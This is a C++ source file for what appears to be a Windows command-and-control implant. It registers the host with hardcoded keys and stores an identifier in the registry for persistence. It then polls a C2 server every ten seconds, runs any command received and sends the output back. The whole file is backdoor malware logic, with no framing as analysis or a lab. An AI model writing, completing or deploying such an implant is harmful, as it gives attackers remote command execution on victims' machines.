#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <vector>
#include <winhttp.h>
#include "checkin.h"
#include "UUID.h"
#include "Commands.h"

#pragma comment(lib, "ws2_32.lib")

using namespace std;

int main() {
    std::string uuid;
    std::string encryptionKey;
	std::string decryptionKey;
    RegistryManager::ReadUUID(uuid);

    if (uuid.empty()) {
        SystemInfo info;
        bool result = GetSystemInfo(info);
        uuid = info.hashedUUID;
        encryptionKey = "U2VjcmV0RW5jcnlwdGlvbktleSEhMQ==";
        decryptionKey = "U2VjcmV0RGVjcnlwdGlvbktleSEhMQ==";

        if (!SendRegisterRequest(info, encryptionKey, decryptionKey)) {
            std::cerr << "Error sending register request\n";
            return 1;
        }
        bool resultWrite = RegistryManager::WriteUUID(uuid);
        if (!resultWrite) {
            std::cerr << "Error writing UUID to registry\n";
            return 1;
        }
    }

    while (true) {
        string commandToRun = GetCommandFromC2(uuid);
        if (commandToRun != "No pending commands\n") {
            std::cout << "Command to run: " << commandToRun << std::endl;
            string output = executeCommand(commandToRun.c_str());
            cout << "Output: " << output << endl;
            bool result = SendCommandOutput(uuid, commandToRun, output, encryptionKey, decryptionKey);
        }
        else {
            cout << "No pending commands" << endl;
        }
        Sleep(10000);
    }


    return 0;
}